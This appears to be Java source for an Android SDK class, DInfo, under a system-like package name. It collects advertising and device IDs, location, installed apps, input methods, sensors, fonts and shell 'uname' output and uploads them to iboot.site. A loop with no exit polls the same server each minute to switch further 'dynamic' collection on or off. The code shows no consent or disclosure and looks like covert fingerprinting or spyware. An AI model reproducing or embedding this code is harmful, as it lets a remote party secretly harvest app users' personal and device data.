package com.android.device;

import android.content.Context;
import android.media.RingtoneManager;
import android.os.Build;

import com.android.assemble.CollectDeviceInfo;
import com.android.device.appsflyer.AppsflyerInfo;
import com.android.device.comm.Location;
import com.android.device.comm.Net;
import com.android.device.ext.XhsInfo;
import com.android.device.hardware.Battery;
import com.android.device.hardware.Gpu;
import com.android.device.hardware.Hardware;
import com.android.device.hardware.InputDevices;
import com.android.device.hardware.Sensor;
import com.android.device.hardware.Storage;
import com.android.device.hardware.USB;
import com.android.device.ids.IDs;
import com.android.device.software.FileStat;
import com.android.device.software.Fonts;
import com.android.device.software.Input;
import com.android.device.software.InputLanguage;
import com.android.device.software.Library;
import com.android.device.software.Media;
import com.android.device.software.PackageInfo;
import com.android.device.software.ServiceList;
import com.android.utils.AppUtils;
import com.android.utils.Cmd;
import com.android.utils.Http;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import java.util.TimeZone;


import com.android.device.dynamic.DynamicCollect;

public class DInfo {
    private static final String TAG = "DInfoTAG";

    private static int prevState = 0;

    /**
     * 检查报告开关状态
     *
     * @param context         上下文对象
     * @param biz             业务标识
     * @param ownerSdkVersion SDK版本
     * @param url             请求URL
     * @param isDynamic       是否是动态报告
     * @return 返回报告开关状态字符串
     * @throws Exception 抛出异常
     */
    private static String checkReportSwitch(Context context, String biz, String ownerSdkVersion, String url, boolean isDynamic) throws Exception {
        Map<String, String> params = new HashMap<>();
        params.put("gaid", IDs.getGoogleADID(context));
        params.put("biz", biz);

        JSONObject request = new JSONObject();
        String country = XhsInfo.getNetworkCountryIso(context);
        request.put("country", "<absent>".equals(country) ? Locale.getDefault().getCountry() : country);
        request.put("androidSdkVersion", String.valueOf(Build.VERSION.SDK_INT));
        request.put("ownerSdkVersion", ownerSdkVersion);
        request.put("packageName", context.getPackageName());

        android.content.pm.PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
        request.put("packageVersion", packageInfo.versionName);

        String result = Http.submitGetData(url, params, request.toString());
        if (result.equals(Http.BAD_CONNECT)) {
            return Http.BAD_CONNECT;
        }

        JSONObject response = new JSONObject(result);
        if (response.getInt("code") != 0) {
            return "disable";
        }

        if (isDynamic) {
            JSONObject data = response.getJSONObject("data");
            DynamicCollect.uploadParameter(data.getInt("cf"), data.getInt("rf"));
        }
        return "enable";
    }

    /**
     * 开始动态数据收集
     *
     * @param context         上下文
     * @param biz             业务类型
     * @param ownerSdkVersion 所有者SDK版本
     */
    private static void startDynamicDataCollection(Context context, String biz, String ownerSdkVersion) {
        DynamicCollect dynamicCollect = new DynamicCollect(context);
        while (true) {
            try {
                if ("disable".equals(checkReportSwitch(context, biz, ownerSdkVersion, "https://iboot.site/dio/drsw", true))) {
                    if (prevState == 1) {
                        dynamicCollect.stop();
                        prevState = 0;
                    }
                    SystemClock.sleep(60000);
                } else {
                    if (prevState == 0) {
                        dynamicCollect.start();
                        prevState = 1;
                    }
                    SystemClock.sleep(60000);
                }
            } catch (Exception e) {
                if (prevState == 1) {
                    dynamicCollect.stop();
                    prevState = 0;
                    return;
                }
            }
        }
    }

    /**
     * 获取设备信息并上传
     *
     * @param context         上下文对象
     * @param biz             业务标识
     * @param ownerSdkVersion 所有者SDK版本
     * @return 返回JSON格式的字符串或错误信息
     */
    public static String getDInfo(Context context, String biz, String ownerSdkVersion) {

        try {
            JSONObject jsonObject = new JSONObject();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HHmmssZ", Locale.US);
            sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
            jsonObject.put("time", sdf.format(new Date(System.currentTimeMillis())));
            jsonObject.put("appsflyerdebuginfo", AppsflyerInfo.getAppsflyerInfo(context));
            jsonObject.put("ids", IDs.getIDsInfo(context));
            jsonObject.put("build", com.android.device.software.Build.getBuildInfo());
            jsonObject.put("input", Input.getInputInfo(context));
            jsonObject.put("library", Library.getLibraryInfo(context));
            jsonObject.put("media", Media.getMediaInfo(context));
            jsonObject.put("storage", Storage.getStorageInfo(context));
            jsonObject.put("memThreshold", Storage.getMemoryThreshold(context));
            jsonObject.put("usb", USB.getUsbInfo(context));
            jsonObject.put("sensor", Sensor.getSensorInfo(context));
            jsonObject.put("hardware", Hardware.getHardwareInfo(context));
            jsonObject.put("batteryInfo", Battery.getBatteryInfo(context));
            jsonObject.put("net", Net.getNetInfo(context));
            jsonObject.put("location", Location.getLocationInfo(context));
            jsonObject.put("packageInfo", PackageInfo.getInstallerInfo(context));
            jsonObject.put("deviceInfo", CollectDeviceInfo.getDeviceInfo());

            jsonObject.put("fileStat", FileStat.getFileStat());
            jsonObject.put("fonts", Fonts.getFonts(context));
            jsonObject.put("systemFonts", Fonts.getSystemFonts());
            jsonObject.put("ringTitle", RingtoneManager.getRingtone(context, Settings.System.DEFAULT_RINGTONE_URI).getTitle(context));
            jsonObject.put("InputLanguageList", InputLanguage.getInputLanguageList(context));
            jsonObject.put("inputMethods", Settings.Secure.getString(context.getContentResolver(), "enabled_input_methods"));

            jsonObject.put("installedApps", AppUtils.getAppsInfoJson(context));
            jsonObject.put("gpuInfo", Gpu.getGpuInfo(context));
            jsonObject.put("inputDevices", InputDevices.getInputDevices(context));
            jsonObject.put("uname", Cmd.exe("uname -a"));

            jsonObject.put("service_list", ServiceList.getServiceListInfo());
            if (context.getPackageName().equals("com.android.device")) {
                try {
                    Log.d(TAG, "输出文件到/data/data/");

                    FileOutputStream fos = context.openFileOutput("debug_output.json", Context.MODE_PRIVATE);
                    Writer writer = new OutputStreamWriter(fos);
                    writer.write(jsonObject.toString());
                    writer.close();

                    Log.d(TAG, "输出文件到/sdcard/Download/");
                    byte[] jsonData = jsonObject.toString().getBytes();
                    File file = new File("/sdcard/Download/debug_output.json");
                    if (file.exists()) {
                        file.delete();
                    }
                    file.createNewFile();
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    fileOutputStream.write(jsonData);
                    fileOutputStream.close();
                } catch (Exception e) {
                    //ignore
//                        e.printStackTrace();
                }
            }
            if (!jsonObject.toString().isEmpty()) {
                return Http.uploadData(jsonObject.toString(), "https://iboot.site/dio/rsd?biz=" + biz, biz);
            } else {
                return "empty";
            }
        } catch (Exception e) {
            return "error";
        }
    }
}
